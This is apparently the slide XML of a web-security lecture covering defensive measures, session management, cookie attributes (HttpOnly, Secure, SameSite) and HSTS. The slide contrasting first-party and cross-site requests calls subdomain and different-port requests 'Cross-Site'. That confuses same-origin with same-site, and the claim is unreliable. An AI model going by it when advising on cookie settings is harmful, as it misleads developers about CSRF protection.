          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>User awareness &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>security training</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Block </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>suspicious domains &amp; ads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> with web filters.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>browser sandboxing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> to reduce damage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>reputation-based URL filtering</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Encourage checking URLs before clicking.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>endpoint security solutions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Apply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>zero-trust principles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> (verify all interactions).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="154453026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A3CBB-8D13-03ED-8C5C-B5C1913389FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Session Management </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EB82D8EF-5DE7-8DC9-6C51-FF13E1C7580E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Session Management</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is the process by which a web application maintains state and tracks the identity of a user across multiple HTTP requests. Since HTTP is stateless, the server needs a way to recognize that a series of requests come from the same user. This is fundamental for logins, shopping carts, user preferences, and other personalized experiences. The core mechanism involves:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Creating a Session:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Upon a user's first visit or successful login, the server generates a unique, random </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Storing Session Data:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The server stores data related to that session (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, username, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cart_items</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) in a secure server-side store.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Exchanging the Session ID:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The server sends the Session ID to the client's browser, typically using a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Validating Requests:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> For every subsequent request, the browser automatically sends the Session ID back to the server. The server uses this ID to look up the corresponding session data and identify the user.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="122808964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0AFFA-16B1-DB98-80F0-1504D0563A4D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Security Headers</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{878A180B-CADC-B2C0-AA28-E23EADC7548C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="575187"/>
            <a:ext cx="7704000" cy="4028763"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>These are directives sent by the server in HTTP responses to instruct the browser on how to behave. They are a first line of defense.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTTP is stateless </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>→ it does not remember users across requests.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Session management </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>is how web applications keep track of logged-in users using a Session ID.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Session ID </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>is often stored in a cookie and sent with each request to prove the user’s identity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Cookie Attribute</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>When set on a cookie, this flag prevents the cookie from being accessed by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>client-side JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Protects against </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>XSS stealing cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Set-Cookie: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>sessionId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>=abc123; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>2. Secure Cookie Attribute</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ensures cookies are sent only over </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, not HTTP.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prevents theft on insecure networks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Set-Cookie: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>sessionId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>=abc123; Secure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="252771132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05D2A-DA95-A3EF-731C-7A9D87A5C3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98E433-63BD-6FC0-E5CE-5D2572F03761}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Security Headers</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{65F8D6E5-5FC3-B994-35A6-FBE57739D272}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Attribute</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Determines when a website's cookies are included in requests originating from other websites</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prevents cookies from being sent in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>cross-site requests</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> → mitigates CSRF.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Set-Cookie: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>sessionId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>=abc123; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>=Strict</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Strict:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Cookie is only sent in a first-party context. (Best security, can break usability).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Lax (Recommended):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Cookie is sent with safe top-level navigations (e.g., clicking a link) but not with cross-site POST requests. (Excellent balance of security and usability).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>None:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Cookie is sent with all requests. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Must</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> be used with Secure. (Rarely needed and dangerous).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>4. Strict-Transport-Security (HSTS): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Tells the browser to automatically convert all HTTP links to HTTPS for the site for a specified period. It prevents protocol downgrade attacks and ensures the Secure cookie flag is always effective from the very first request.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="170817191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13E30-A755-B3E8-44D6-7171288E106E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Examples: First-Party vs. Cross-Site Requests</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AC429010-6018-6150-054D-A59DBDEE951B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Let's imagine you are on a webpage at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://shopping.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://shopping.com/api/data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>First-Party. Same protocol, domain, and port.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>https://api.shopping.com/data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-Site. The domain is different (api.shopping.com vs. shopping.com). Subdomains count as different origins!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>http://shopping.com/profile - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-Site. The protocol is different (http vs https).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>https://shopping.com:8080/news - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-Site. The port is different (8080 vs the default 443).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>https://social-media.com/like - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-Site. The domain is completely different.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="129113139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CF2DA-6B64-B1C1-129F-237F5A6E87A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Cookies</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D55E54E1-2BE7-3A0E-7047-9BF2D7A4747C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Cookies are the primary vehicle for transmitting the Session ID between the client and server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>They are key-value pairs set by the server via the Set-Cookie HTTP response header.</a:t>
            </a:r>
          </a:p>
          <a:p>
